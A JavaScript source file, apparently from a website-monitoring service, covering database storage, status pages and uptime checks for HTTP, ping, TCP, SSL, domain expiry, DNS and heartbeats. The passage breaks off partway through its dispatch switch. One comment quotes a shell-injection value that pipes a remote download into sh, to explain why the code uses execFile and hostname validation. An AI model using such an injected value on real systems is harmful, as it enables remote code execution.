// 监控存储 + 轮询核心（PostgreSQL 持久化）
// Phase 1 扩展：多检查类型(G1) / 区域探针(G3) / 检查明细(G6)

import crypto from 'crypto';
import net from 'node:net';
import os from 'node:os';
import { promisify } from 'node:util';
import { getPool } from './db.js';
import { getUserById } from './auth.js';
import { planFeatures, planHasStatusPage } from './plans.js';
import { MON_ERR } from './monerr.js';
import { assertSafeTarget, safeFetch } from './ssrf-guard.js';
import { checkAiVisibility } from './ai-visibility.js';

// node:dns / node:tls / node:child_process 改为**懒加载**（Worker 兼容，ADR-0001）：
// Cloudflare Workers(nodejs_compat) 不保证提供这三类能力（child_process 必无；dns/tls 视版本），
// 顶层静态 import 若模块缺失会让整个 Worker 启动失败。懒加载后：
//   · Fly：动态 import 解析结果与静态 import 完全一致，行为零变化；
//   · Worker：ping/ssl/domain/dns 四类非 HTTP 检查在能力缺失时按 down + 错误码落库（HTTP 类不受影响）。
// node:net / node:os / node:util 保留静态 import（pg 驱动经 Hyperdrive 依赖 net，必然可用）。
let _dnsMod = null;   // null=未加载, false=不可用
let _tlsMod = null;
let _execFile = null;
async function getDns() {
  if (_dnsMod === null) { try { _dnsMod = await import('node:dns'); } catch { _dnsMod = false; } }
  return _dnsMod || null;
}
async function getTls() {
  if (_tlsMod === null) { try { _tlsMod = await import('node:tls'); } catch { _tlsMod = false; } }
  return _tlsMod || null;
}
// P0-S1：必须用 execFile（参数数组、不经 shell）。旧的 `exec(\`ping ... ${host}\`)` 会把
// 用户填的 target 直接拼进 shell 命令，`example.com; curl http://x | sh` 即可远程执行。
async function getExecFile() {
  if (_execFile === null) {
    try {
      const cp = await import('node:child_process');
      _execFile = promisify(cp.execFile || (cp.default && cp.default.execFile));
    } catch { _execFile = false; }
  }
  return _execFile || null;
}

// 单点 HTTP/Keyword 检查超时（ms）。东京探针探远端偶发抖动，10s 偏紧易误判 down；
// 提到 15s，并允许经环境变量 CHECK_TIMEOUT_MS 调参，无需重新部署即可微调。
const HTTP_TIMEOUT_MS = Number(process.env.CHECK_TIMEOUT_MS) || 15000;

// AbortSignal.timeout() 抛的是 DOMException/TimeoutError，不是 AbortError。
// 统一判定，避免超时被当成普通错误落到 last_error（前端看不到 timeout 语义）。
const isTimeoutErr = (err) => !!err && (err.name === 'AbortError' || err.name === 'TimeoutError');

// 检查结果回调（由 alerts.js 注入），签名：(monitor, result, ctx)
let onCheckResult = null;
export function setCheckResultHandler(fn) {
  onCheckResult = fn;
}
// 向后兼容别名
export const setStatusChangeHandler = setCheckResultHandler;

function parseJSON(str, fallback = null) {
  if (!str) return fallback;
  try { return JSON.parse(str); } catch { return fallback; }
}

// ===== 套餐 plan 缓存（避免每次检查查库）=====
const planCache = new Map(); // userId -> {plan, ts}
async function getPlan(userId) {
  if (!userId) return 'free';
  const cached = planCache.get(userId);
  if (cached && Date.now() - cached.ts < 5 * 60 * 1000) return cached.plan;
  try {
    const u = await getUserById(userId);
    const plan = u?.plan || 'free';
    planCache.set(userId, { plan, ts: Date.now() });
    return plan;
  } catch {
    return 'free';
  }
}

// 慢响应 / 告警去重状态（单进程内）
const slowState = new Map(); // monitorId -> lastSlowAt

export function createMonitor({ url, name, interval = 60, userId = null, type = 'http', config = {}, channels = null, teamId = null }) {
  const id = crypto.randomUUID();
  // 内部状态位（_ai 等）不接受客户端写入（P1-⑧，2026-11-18）：伪造 config._ai.prev
  // 可让 AI 检查误判「没有变化」⇒ 压掉告警。Worker 的 Web 创建口此前已剥（api.js:630），
  // 但 createMonitor 是所有创建路径（Web/v1/导入 × Express/Worker）的单一汇合点，
  // 在这里剥一次 = 全部入口同时收口；后端会在检查时按需初始化 _ai（monitors.js:753）。
  // Heartbeat 上报令牌（P1，2026-11-18）：上报端点旧实现只凭 id 就能把任意监控改成 up，
  // 而公开状态页会把 id 返回给访客。新建的 heartbeat 监控一律生成令牌，上报时必须带 ?token=。
  const base = (config && typeof config === 'object') ? { ...config } : {};
  delete base._ai;
  let finalConfig = base;
  if (type === 'heartbeat') {
    if (!base.heartbeatToken) base.heartbeatToken = crypto.randomBytes(16).toString('hex');
    finalConfig = base;
  }
  return {
    id,
    url,
    name: name || url,
    interval,
    type,
    config: finalConfig,
    channels,
    status: 'unknown',
    statusPublic: false,
    consecutiveFailures: 0,
    userId,
    teamId,
  };
}

function rowToMonitor(row) {
  return {
    id: row.id,
    url: row.url,
    name: row.name,
    interval: row.interval,
    type: row.type || 'http',
    config: parseJSON(row.config, {}),
    channels: parseJSON(row.channels, null),
    status: row.status,
    statusPublic: row.status_public,
    lastChecked: Number(row.last_checked),
    lastResponseTime: row.last_response_time,
    lastError: row.last_error,
    lastAlertAt: row.last_alert_at ? Number(row.last_alert_at) : null,
    alertCount: row.alert_count || 0,
    consecutiveFailures: row.consecutive_failures || 0,
    lastSuccessAt: row.last_success_at ? Number(row.last_success_at) : null,
    userId: row.user_id,
    teamId: row.team_id || null,
    createdAt: row.created_at,
  };
}

const MONITOR_UPSERT_SQL = `INSERT INTO monitors (id, url, name, interval, type, config, channels, status, status_public, last_checked, last_response_time, last_error, last_alert_at, alert_count, consecutive_failures, last_success_at, user_id, team_id)
     VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15,$16,$17,$18)
     ON CONFLICT (id) DO UPDATE SET
       url                 = EXCLUDED.url,
       name                = EXCLUDED.name,
       interval            = EXCLUDED.interval,
       type                = EXCLUDED.type,
       config              = EXCLUDED.config,
       channels            = EXCLUDED.channels,
       status              = EXCLUDED.status,
       status_public       = EXCLUDED.status_public,
       last_checked        = EXCLUDED.last_checked,
       last_response_time  = EXCLUDED.last_response_time,
       last_error          = EXCLUDED.last_error,
       last_alert_at       = EXCLUDED.last_alert_at,
       alert_count         = EXCLUDED.alert_count,
       consecutive_failures = EXCLUDED.consecutive_failures,
       -- P0-S4：heartbeat 的 last_success_at 是「客户端上报时间」，只能由上报端点写。
       -- 轮询（含 dead-man 检查）若把它刷新成检查时间，会让监控自我续命、真停了也不告警。
       last_success_at     = CASE WHEN EXCLUDED.type = 'heartbeat' THEN monitors.last_success_at ELSE EXCLUDED.last_success_at END,
       team_id             = EXCLUDED.team_id`;

function monitorParams(monitor) {
  const cfg = monitor.config && typeof monitor.config === 'object' ? JSON.stringify(monitor.config) : (monitor.config || null);
  const ch = monitor.channels && typeof monitor.channels === 'object' ? JSON.stringify(monitor.channels) : (monitor.channels || null);
  return [
    monitor.id, monitor.url, monitor.name, monitor.interval, monitor.type, cfg, ch,
    monitor.status, monitor.statusPublic ?? false, monitor.lastChecked ?? null,
    monitor.lastResponseTime ?? null, monitor.lastError ?? null, monitor.lastAlertAt ?? null,
    monitor.alertCount ?? 0, monitor.consecutiveFailures ?? 0, monitor.lastSuccessAt ?? null, monitor.userId || null,
    monitor.teamId || null,
  ];
}

export async function saveMonitor(monitor) {
  const pool = await getPool();
  await pool.query(MONITOR_UPSERT_SQL, monitorParams(monitor));
}

// 原子建监控（P1，2026-11-18）：把「配额检查」与「插入」放进同一个事务，
// 并用事务级 advisory lock 按用户串行化。旧实现 SELECT count 后再 INSERT，
// 并发请求可以同时通过检查、突破套餐上限（v1 无配额时更严重）。
// 返回 true=已创建；false=已达上限（调用方回 403）。
export async function insertMonitorWithinLimit(monitor, limit) {
  if (!monitor.userId) { await saveMonitor(monitor); return true; }
  const pool = await getPool();
  let client;
  try {
    client = await pool.connect();
  } catch (e) {
    // 连接池不可用（极少数运行时的 socket 限制）：退回非原子写入，
    // 优先保证「能建监控」；调用方此前已做过一次 count 检查，不是完全无防护。
    console.warn('[monitor] 无法开启配额事务，退回非原子写入:', e && e.message);
    await saveMonitor(monitor);
    return true;
  }
  try {
    await client.query('BEGIN');
    // hashtext 把用户 id 映射成 32 位锁键；事务提交/回滚即释放，不会泄漏锁
    await client.query('SELECT pg_advisory_xact_lock(hashtext($1))', ['monitor_quota:' + monitor.userId]);
    const { rows } = await client.query('SELECT COUNT(*)::int AS n FROM monitors WHERE user_id = $1', [monitor.userId]);
    if ((rows[0]?.n || 0) >= limit) {
      await client.query('ROLLBACK');
      return false;
    }
    await client.query(MONITOR_UPSERT_SQL, monitorParams(monitor));
    await client.query('COMMIT');
    return true;
  } catch (e) {
    try { await client.query('ROLLBACK'); } catch { /* 忽略回滚失败，抛原错 */ }
    throw e;
  } finally {
    client.release();
  }
}

// Heartbeat 上报专用写入（P0-S4 配套）：只有这里能改 last_success_at。
// 不能复用 saveMonitor —— 它对 heartbeat 类型刻意保留旧值（防止轮询自我续命），
// 若上报也走那条 SQL，会导致「上报永远不生效」的反向 bug。
export async function recordHeartbeat(id, ts = Date.now()) {
  const pool = await getPool();
  const { rowCount } = await pool.query(
    `UPDATE monitors
        SET last_success_at = $2,
            status = CASE WHEN status = 'down' THEN 'up' ELSE status END
      WHERE id = $1 AND type = 'heartbeat'`,
    [id, ts]
  );
  return (rowCount || 0) > 0;
}

export async function saveEvent(monitorId, event) {
  const pool = await getPool();
  await pool.query(
    `INSERT INTO monitor_events (monitor_id, event_type, from_status, to_status, response_time, error, detail)
     VALUES ($1,$2,$3,$4,$5,$6,$7)`,
    [monitorId, event.eventType, event.fromStatus, event.toStatus, event.responseTime, event.error, event.detail]
  );
}

// 写入每次检查明细（G6 趋势图）
export async function saveCheck(monitorId, { ts, status, responseTime, region, error }) {
  const pool = await getPool();
  await pool.query(
    `INSERT INTO monitor_checks (monitor_id, ts, status, response_time, region, error)
     VALUES ($1,$2,$3,$4,$5,$6)`,
    [monitorId, ts, status, responseTime ?? null, region ?? null, error ?? null]
  );
}

export async function listMonitors(userId) {
  const pool = await getPool();
  if (userId) {
    const { rows } = await pool.query('SELECT * FROM monitors WHERE user_id = $1 ORDER BY created_at DESC', [userId]);
    return rows.map(rowToMonitor);
  }
  const { rows } = await pool.query('SELECT * FROM monitors ORDER BY created_at DESC');
  return rows.map(rowToMonitor);
}

// 只取「已到检查时间」的监控（P1-④，2026-09-23）。
// 旧实现是轮询器直接调 listMonitors()（`SELECT * FROM monitors ORDER BY created_at DESC`，无 WHERE、无 LIMIT）：
// 5 秒一次 = 12 次/分钟 = 17,280 次/天全表读，而表只会变大 ⇒ 读放大随行数线性增长。
// 改为按 last_checked 索引做增量取数，到期判据与原内存判据完全等价：
//   内存判据：!m.lastChecked || now - m.lastChecked >= m.interval * 1000
//   SQL 判据：last_checked IS NULL OR last_checked <= now - interval * 1000
// 依赖索引 idx_monitors_last_checked（见 src/db.js 迁移）。limit 兜住单轮规模，剩下的下一轮继续。
export async function listDueMonitors(nowMs = Date.now(), limit = 200) {
  const pool = await getPool();
  const { rows } = await pool.query(
    `SELECT * FROM monitors
      WHERE last_checked IS NULL
         OR last_checked <= $1::bigint - (interval::bigint * 1000)
      ORDER BY last_checked ASC NULLS FIRST
      LIMIT $2`,
    [nowMs, Math.max(1, Number(limit) || 200)]
  );
  return rows.map(rowToMonitor);
}

export async function getMonitor(id) {
  const pool = await getPool();
  const { rows } = await pool.query('SELECT * FROM monitors WHERE id = $1', [id]);
  return rows[0] ? rowToMonitor(rows[0]) : null;
}

// 公开状态页：按 slug 或自定义域名取用户 + 其公开监控
// byHost=true 时用 status_custom_domain 解析（G7 自定义域名）
// ① 降级宽限（Martin 2026-11-18 定案）：套餐失去状态页资格后，公开页再保留
// STATUS_PAGE_GRACE_DAYS（默认 30 天，环境变量可调），到期公开端点全部 404；
// 仪表盘同时展示宽限横幅与续费入口（见 index.html loadStatusPage）。
const STATUS_PAGE_GRACE_MS =
  Math.max(0, Number(process.env.STATUS_PAGE_GRACE_DAYS ?? 30)) * 86400000;

async function loadStatusPageUser(slugOrHost, byHost) {
  const pool = await getPool();
  const col = byHost ? 'status_custom_domain' : 'public_slug';
  const { rows } = await pool.query(
    `SELECT id, email, name, public_slug, status_page_enabled, status_white_label, status_password_hash, status_page_title, plan, plan_downgraded_at
     FROM users WHERE ${col} = $1`,
    [slugOrHost]
  );
  if (!rows.length || !rows[0].status_page_enabled) return null;
  const u = rows[0];
  if (!planHasStatusPage(u.plan)) {
    // 失去资格：在宽限期内仍可访问，过期（或无降级时间戳的异常行）一律 404。
    const dg = Number(u.plan_downgraded_at || 0);
    if (!dg || Date.now() - dg > STATUS_PAGE_GRACE_MS) return null;
  }
  return u;
}

export async function getStatusPage(slug) {
  const u = await loadStatusPageUser(slug, false);
  if (!u) return null;
  return buildStatusPage(u);
}

// 公开响应整形（P1-⑭，2026-11-18）：剥掉内部 id；事故事件的 monitor_id 解析成名称。
// 四个出口（/api/status/:slug 与 /api/status-page × Express/Worker）共用此结构。
export function toPublicPage(page, incidentsRaw) {
  const nameById = new Map(page.monitors.map((m) => [m.id, m.name]));
  const incidents = (incidentsRaw || []).map(({ monitor_id, ...rest }) => ({
    ...rest, monitor: nameById.get(monitor_id) || monitor_id,
  }));
  return {
    title: page.title,
    whiteLabel: page.whiteLabel,
    monitors: page.monitors.map(({ id, ...m }) => m),
    incidents,
  };
}

// G7 自定义域名：按 Host 解析
export async function getStatusPageByHost(host) {
  const u = await loadStatusPageUser(host, true);
  if (!u) return null;
  return buildStatusPage(u);
}

async function buildStatusPage(u) {
  const pool = await getPool();
  const { rows: ms } = await pool.query(
    'SELECT id, name, url, type, status, last_checked, last_response_time FROM monitors WHERE user_id = $1 AND status_public = true ORDER BY created_at DESC',
    [u.id]
  );
  return {
    // 🔴 不返回 email：状态页是公开页面，标题只能用展示名（P1-5）
    // 回退链：status_page_title → name → null（前端回退到通用文案）
    title: u.status_page_title || u.name || null,
    whiteLabel: !!u.status_white_label,
    private: !!u.status_password_hash,
    // id 仅供服务端内部用（getStats/getStatusIncidents 聚合）；**公开响应里必须在
    // handler 层剥掉**（P1-⑭，2026-11-18）——公开 payload 带监控 UUID 是纯暴露，
    // 心跳已加 token+类型限制后 id 无任何访客侧用途。事故事件名称由服务端解析
    // 成 monitor 字段下发，前端不再需要 id↔名称映射表。
    monitors: ms.map((m) => ({
      id: m.id, name: m.name, url: m.url, type: m.type,
      status: m.status, lastChecked: Number(m.last_checked), lastResponseTime: m.last_response_time,
    })),
  };
}

// 状态页私有访问：返回校验所需的元数据（slug 或 host）
export async function getStatusPageAuth(slugOrHost, byHost) {
  const u = await loadStatusPageUser(slugOrHost, byHost);
  if (!u) return null;
  return { slug: u.public_slug, private: !!u.status_password_hash, passwordHash: u.status_password_hash };
}

// 取状态页主用户 id（订阅/解锁用）
export async function getStatusPageOwnerId(slugOrHost, byHost) {
  const u = await loadStatusPageUser(slugOrHost, byHost);
  return u ? u.id : null;
}

// 团队监控列表（G9）：团队内共享可见
export async function listTeamMonitors(teamId) {
  const pool = await getPool();
  const { rows } = await pool.query(
    'SELECT id, name, url, type, status, user_id FROM monitors WHERE team_id = $1 ORDER BY created_at DESC',
    [teamId]
  );
  return rows.map(rowToMonitor);
}

// 删除监控。归属按「本人优先、团队次之」两级判定：
// 旧实现只按 user_id 限定，团队成员删除共享监控时删 0 行却仍回 ok（P1 假成功）。
export async function deleteMonitor(id, userId, teamId = null) {
  const pool = await getPool();
  if (userId) {
    const { rowCount } = await pool.query('DELETE FROM monitors WHERE id = $1 AND user_id = $2', [id, userId]);
    if (rowCount > 0) return true;
  }
  if (teamId) {
    const { rowCount } = await pool.query('DELETE FROM monitors WHERE id = $1 AND team_id = $2', [id, teamId]);
    return rowCount > 0;
  }
  if (!userId) {
    const { rowCount } = await pool.query('DELETE FROM monitors WHERE id = $1 AND user_id IS NULL', [id]);
    return rowCount > 0;
  }
  return false;
}

export async function getHistory(id, limit = 50) {
  const pool = await getPool();
  const { rows } = await pool.query(
    `SELECT monitor_id, event_type, from_status, to_status, response_time, error, detail, created_at
     FROM monitor_events WHERE monitor_id = $1 ORDER BY created_at DESC LIMIT $2`,
    [id, limit]
  );
  return rows;
}

// 趋势统计数据（G6）
export async function getStats(id, days = 30) {
  const pool = await getPool();
  const since = Date.now() - days * 86400 * 1000;
  const { rows } = await pool.query(
    `SELECT ts, status, response_time, region
     FROM monitor_checks WHERE monitor_id = $1 AND ts >= $2 ORDER BY ts ASC`,
    [id, since]
  );
  const checks = rows.length;
  const downs = rows.filter((r) => r.status === 'down').length;
  const ups = checks - downs;
  const uptime = checks ? (ups / checks) * 100 : null;
  const rts = rows.filter((r) => r.response_time != null).map((r) => r.response_time);
  const avgRt = rts.length ? Math.round(rts.reduce((a, b) => a + b, 0) / rts.length) : null;
  // P95 用最近秩（nearest-rank）：ceil(0.95·N) 第 N 个。旧写法 floor(0.95·N) 在 N=100
  // 时取到第 96 个值，系统性偏高半位（付费统计口径，P1-⑤）。
  const p95Rt = rts.length ? rts.sort((a, b) => a - b)[Math.max(0, Math.ceil(rts.length * 0.95) - 1)] : null;
  return {
    days,
    checks,
    uptime,
    avgRt,
    p95Rt,
    series: rows.map((r) => ({ ts: Number(r.ts), status: r.status, rt: r.response_time })),
  };
}

// 公开状态页：取某状态页下所有监控的近期事故事件（down/up/warning）
export async function getStatusIncidents(monitorIds, days = 30, limit = 20) {
  const pool = await getPool();
  if (!monitorIds || !monitorIds.length) return [];
  // ⚠️ monitor_events.created_at 是 TIMESTAMPTZ：必须传 ISO 串/Date，不能传毫秒整数
  // （传毫秒会被 Postgres 当成「秒」→ date/time field value out of range → 状态页整个 500。P1-9）
  const since = new Date(Date.now() - days * 86400 * 1000).toISOString();
  const { rows } = await pool.query(
    `SELECT monitor_id, event_type, from_status, to_status, error, detail, created_at
     FROM monitor_events WHERE monitor_id = ANY($1) AND created_at >= $2
     ORDER BY created_at DESC LIMIT $3`,
    [monitorIds, since, limit]
  );
  return rows;
}

// ============================================================
// 检查器实现（G1）
// ============================================================

function codeInExpected(resStatus, expected) {
  if (!expected || !expected.length) return resStatus >= 200 && resStatus < 400;
  return expected.includes(resStatus);
}

async function checkHttp(url, config) {
  const expected = config.expectedStatuses; // e.g. [200,201]
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), HTTP_TIMEOUT_MS);
  try {
    const res = await safeFetch(url, {
      method: config.method || 'GET',
      signal: controller.signal,
      headers: { 'User-Agent': 'Pingory/1.0' },
    });
    clearTimeout(timeout);
    const rt = null; // 在调用处统一计时
    if (!codeInExpected(res.status, expected)) {
      return { status: 'down', error: `HTTP ${res.status}` };
    }
    return { status: 'up', error: null };
  } catch (err) {
    clearTimeout(timeout);
    return { status: 'down', error: isTimeoutErr(err) ? 'timeout' : err.message };
  }
}

async function checkKeyword(url, config) {
  const kw = config.keyword;
  if (!kw) return { status: 'down', error: MON_ERR.KW_MISSING };
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), HTTP_TIMEOUT_MS);
  try {
    const res = await safeFetch(url, { method: 'GET', signal: controller.signal, headers: { 'User-Agent': 'Pingory/1.0' } });
    if (!res.ok) return { status: 'down', error: `HTTP ${res.status}` };
    // P0-S3：超时必须覆盖 res.text()。旧代码在读完响应头就 clearTimeout，
    // 「只握手不吐 body」的目标会让这里永久挂起并占住并发槽。
    const body = await res.text();
    const found = config.keywordCaseSensitive
      ? body.includes(kw)
      : body.toLowerCase().includes(kw.toLowerCase());
    return found
      ? { status: 'up', error: null }
      : { status: 'down', error: MON_ERR.KW_NOT_FOUND + "|" + kw };
  } catch (err) {
    return { status: 'down', error: isTimeoutErr(err) ? 'timeout' : err.message };
  } finally {
    clearTimeout(timeout);
  }
}

async function checkPing(host) {
  const execFile = await getExecFile();
  if (!execFile) return { status: 'down', error: MON_ERR.PING_FAILED }; // Worker：无 child_process
  // 第二道防线：即便 execFile 不经 shell，也拒绝以 '-' 开头（会被 ping 当成选项）
  // 与任何非主机名字符（空白、引号、; | & $ ` 等）。
  if (!/^[A-Za-z0-9._:][A-Za-z0-9._:-]*$/.test(host)) {
    return { status: 'down', error: MON_ERR.PING_FAILED };
  }
  const args = os.platform() === 'win32' ? ['-n', '1', host] : ['-c', '1', host];
  try {
    const { stdout } = await execFile('ping', args, { timeout: 8000 });
    const ok = /ttl=/i.test(stdout) || /1 received/i.test(stdout) || /bytes from/i.test(stdout);
    return ok ? { status: 'up', error: null } : { status: 'down', error: MON_ERR.PING_NO_RESPONSE };
  } catch {
    return { status: 'down', error: MON_ERR.PING_FAILED };
  }
}

function checkTcp(host, port) {
  return new Promise((resolve) => {
    const sock = new net.Socket();
    const to = setTimeout(() => { sock.destroy(); resolve({ status: 'down', error: MON_ERR.CONNECT_TIMEOUT }); }, 8000);
    sock.setTimeout(8000);
    sock.once('connect', () => { clearTimeout(to); sock.destroy(); resolve({ status: 'up', error: null }); });
    sock.once('error', (e) => { clearTimeout(to); sock.destroy(); resolve({ status: 'down', error: e.code || e.message }); });
    sock.once('timeout', () => { clearTimeout(to); sock.destroy(); resolve({ status: 'down', error: MON_ERR.CONNECT_TIMEOUT }); });
    sock.connect(Number(port), host);
  });
}

async function checkSsl(host, port = 443, warnDays = 30) {
  const tls = await getTls();
  if (!tls) return { status: 'down', error: MON_ERR.SSL_HANDSHAKE + '|tls_unavailable' }; // Worker
  return new Promise((resolve) => {
    const sock = tls.connect(Number(port), host, { servername: host, timeout: 8000 }, () => {
      const cert = sock.getPeerCertificate();
      sock.destroy();
      if (!cert || !cert.valid_to) return resolve({ status: 'down', error: MON_ERR.SSL_NO_CERT });
      const exp = new Date(cert.valid_to).getTime();
      const now = Date.now();
      if (exp < now) return resolve({ status: 'down', error: MON_ERR.SSL_EXPIRED });
      const days = Math.floor((exp - now) / 86400000);
      if (days <= warnDays) return resolve({ status: 'up', error: null, warn: MON_ERR.SSL_EXPIRING + "|" + days });
      return resolve({ status: 'up', error: null });
    });
    sock.setTimeout(8000);
    sock.once('error', (e) => { sock.destroy(); resolve({ status: 'down', error: MON_ERR.SSL_HANDSHAKE + "|" + (e.code || e.message) }); });
    sock.once('timeout', () => { sock.destroy(); resolve({ status: 'down', error: MON_ERR.SSL_TIMEOUT }); });
  });
}

// 极简 WHOIS 客户端（仅取到期日）。②（Martin 2026-11-18）：TLD 表扩充到 30+ 个
// 有可靠 port-43 WHOIS 服务的后缀；未命中表的后缀退化到 IANA 引荐 → 解析不出再走
// RDAP 兜底（rdap.org 覆盖全部新 gTLD 与多数 ccTLD）。🔴 文档/页面不承诺支持所有后缀。
const WHOIS_SERVERS = {
  // Verisign
  com: 'whois.verisign-grs.com', net: 'whois.verisign-grs.com',
  // Afilias / PIR
  org: 'whois.pir.org', info: 'whois.afilias.net', me: 'whois.nic.me',
  // Google Registry（含 nic.tld 别名）
  dev: 'whois.nic.dev', app: 'whois.nic.app', page: 'whois.nic.page',
  // Identity Digital / Donuts 系（whois.nic.<tld> 模式可靠）
  xyz: 'whois.nic.xyz', online: 'whois.nic.online', site: 'whois.nic.site',
  store: 'whois.nic.store', tech: 'whois.nic.tech', space: 'whois.nic.space',
  website: 'whois.nic.website', club: 'whois.nic.club', vip: 'whois.nic.vip',
  wang: 'whois.nic.wang', pro: 'whois.nic.pro', fun: 'whois.nic.fun',
  icu: 'whois.nic.icu', live: 'whois.nic.live', asia: 'whois.nic.asia',
  // GoDaddy Registry
  cc: 'whois.nic.cc', tv: 'whois.nic.tv', mobi: 'whois.nic.mobi',
  // 其它 gTLD / 短后缀
  io: 'whois.nic.io', ai: 'whois.nic.ai', co: 'whois.nic.co',
  sh: 'whois.nic.sh', ac: 'whois.nic.ac', fm: 'whois.nic.fm', am: 'whois.nic.am',
  so: 'whois.nic.so', im: 'whois.nic.im', name: 'whois.nic.name',
  biz: 'whois.nic.biz', top: 'whois.nic.top', cloud: 'whois.nic.cloud',
  gov: 'whois.dotgov.gov', edu: 'whois.educause.edu',
  // ccTLD（port-43 确认可用）
  us: 'whois.nic.us', uk: 'whois.nic.uk', fr: 'whois.nic.fr',
  nl: 'whois.domain-registry.nl', jp: 'whois.jprs.jp', cn: 'whois.cnnic.cn',
  ru: 'whois.tcinet.ru', br: 'whois.registro.br', au: 'whois.auda.org.au',
  it: 'whois.nic.it', pl: 'whois.dns.pl', nz: 'whois.domainz.net.nz',
  mx: 'whois.mx', kr: 'whois.kr', in: 'whois.registry.in',
  hk: 'whois.hkirc.hk', sg: 'whois.sgnic.sg',
};
function whoisQuery(domain) {
  return new Promise((resolve) => {
    const tld = domain.split('.').pop().toLowerCase();
    const server = WHOIS_SERVERS[tld] || 'whois.iana.org';
    const sock = net.connect(43, server, () => sock.write(domain + '\r\n'));
    let data = '';
    sock.setEncoding('utf8');
    sock.on('data', (c) => (data += c));
    sock.on('close', () => resolve(data));
    sock.on('error', () => resolve(''));
    setTimeout(() => { sock.destroy(); resolve(data); }, 8000);
  });
}
function parseExpiry(whoisText) {
  if (!whoisText) return null;
  // 各注册局字段名差异：Expiry/Expiration/Registry Expiry/paid-till(renewal，ru)/
  // Expiration Time(cn)/Expire Date(it)/Expires on(jprs)/expires(br,se)
  const re = /(expiry date|expiration date|registry expiry date|expiration time|expire date|paid-till|renewal date|expires on|expires)\s*:?\s*(.+)/i;
  const m = whoisText.match(re);
  if (!m) return null;
  const raw = m[2].trim();
  // registro.br 用 YYYYMMDD（如 20270215），Date 构造器不认，手动拆
  if (/^\d{8}$/.test(raw)) {
    const d = new Date(`${raw.slice(0, 4)}-${raw.slice(4, 6)}-${raw.slice(6, 8)}T00:00:00Z`);
    return isNaN(d.getTime()) ? null : d.getTime();
  }
  const d = new Date(raw);
  return isNaN(d.getTime()) ? null : d.getTime();
}
// RDAP 兜底（②，2026-11-18）：rdap.org 按 IANA 引荐 302 到对应注册局，覆盖
// 全部新 gTLD 与多数 ccTLD；WHOIS 解析不出到期日时调用。任何失败静默返回 null。
// （导出仅为可测性；业务入口走 checkDomain）
export async function rdapExpiry(domain) {
  try {
    const res = await safeFetch(`https://rdap.org/domain/${encodeURIComponent(domain)}`,
      { headers: { Accept: 'application/rdap+json, application/json' } }, { maxRedirects: 5 });
    if (!res.ok) return null;
    const j = await res.json();
    const ev = Array.isArray(j.events) ? j.events.find((e) => e && e.eventAction === 'expiration') : null;
    if (!ev || !ev.eventDate) return null;
    const d = new Date(ev.eventDate);
    return isNaN(d.getTime()) ? null : d.getTime();
  } catch {
    return null;
  }
}
async function checkDomain(domain, warnDays = 30) {
  const text = await whoisQuery(domain);
  let exp = parseExpiry(text);
  if (!exp) exp = await rdapExpiry(domain); // WHOIS 无果 → RDAP 兜底
  if (!exp) return { status: 'down', error: MON_ERR.WHOIS_NO_EXPIRY };
  const now = Date.now();
  if (exp < now) return { status: 'down', error: MON_ERR.DOMAIN_EXPIRED };
  const days = Math.floor((exp - now) / 86400000);
  if (days <= warnDays) return { status: 'up', error: null, warn: MON_ERR.DOMAIN_EXPIRING + "|" + days };
  return { status: 'up', error: null };
}

async function checkApi(url, config) {
  const method = config.method || 'GET';
  const headers = config.headers || {};
  const body = config.body ? (typeof config.body === 'string' ? config.body : JSON.stringify(config.body)) : undefined;
  try {
    const res = await safeFetch(url, { method, headers, body });
    if (!res.ok) return { status: 'down', error: `HTTP ${res.status}` };
    const assertPath = config.assertPath;
    if (assertPath) {
      const json = await res.json();
      const actual = assertPath.split('.').reduce((o, k) => (o == null ? o : o[k]), json);
      const expected = config.assertEquals;
      if (String(actual) !== String(expected)) {
        return { status: 'down', error: MON_ERR.ASSERT_FAILED + "|" + assertPath + "|" + actual + "|" + expected };
      }
    }
    return { status: 'up', error: null };
  } catch (err) {
    // safeFetch 默认 15s AbortSignal 超时（P0-S3），覆盖到 res.json() 读取
    return { status: 'down', error: isTimeoutErr(err) ? 'timeout' : err.message };
  }
}

async function checkDns(host, recordType = 'A', expected = []) {
  const dns = await getDns();
  if (!dns || !dns.resolve) return { status: 'down', error: 'DNS 检查能力不可用' }; // Worker
  return new Promise((resolve) => {
    dns.resolve(host, recordType, (err, records) => {
      if (err) return resolve({ status: 'down', error: `DNS 解析失败: ${err.code || err.message}` });
      if (!expected || !expected.length) return resolve({ status: 'up', error: null });
      const exp = expected.map(String);
      const hit = records.some((r) => exp.includes(String(r)));
      return resolve(hit ? { status: 'up', error: null } : { status: 'down', error: `DNS 记录不匹配 (实际: ${records.join(', ')})` });
    });
  });
}

// Heartbeat：被监控方主动上报，超时未上报即 down
function checkHeartbeat(monitor) {
  const intervalMs = (monitor.interval || 60) * 1000;
  const last = monitor.lastSuccessAt;
  if (!last) return { status: 'down', error: MON_ERR.HEARTBEAT_NEVER };
  if (Date.now() - last > intervalMs) return { status: 'down', error: MON_ERR.HEARTBEAT_LATE };
  return { status: 'up', error: null };
}

// 本地单点检查（按 type 分发）；导出供多区域 worker 复用
/**
 * AI 可读性检查专用 fetch：`maxRedirects: 5` 跟随完整跳转链
 * （http→https→www 常见两跳，只跟一跳会把正常站判成 SITE_REDIRECT_LOOP）。
 * 每一跳都过 SSRF 守卫。
 */
const aiFetch = (url, init) => safeFetch(url, init, { maxRedirects: 5 });

export async function runLocalCheck(monitor) {
  const c = monitor.config || {};
  const t = monitor.type;
  const target = monitor.url;
  // SSRF 守卫：HTTP 类由 safeFetch 内部再校验；此处覆盖 tcp/ssl/ping/domain 等非 fetch 类（不发起连接即判 down）
  if (t === 'ping' || t === 'tcp' || t === 'ssl' || t === 'domain') {
    const safety = await assertSafeTarget(target);
    if (!safety.ok) return { status: 'down', error: 'TARGET_BLOCKED:' + safety.reason };
  }
  switch (t) {
    case 'keyword': return checkKeyword(target, c);
    case 'ping': return checkPing(target);
    // 端口合法性前置校验（P1-④）：Number('abc')/端口越界会让 net.Socket.connect 在
    // promise executor 里同步抛 TypeError ⇒ 检查结果永不落库（监控永远停在旧状态）。
    case 'tcp': {
      const p = Number(c.port || 80);
      if (!Number.isInteger(p) || p < 1 || p > 65535) return { status: 'down', error: MON_ERR.PORT_INVALID };
      return checkTcp(target, p);
    }
    case 'ssl': {
      const sp = Number(c.port || 443);
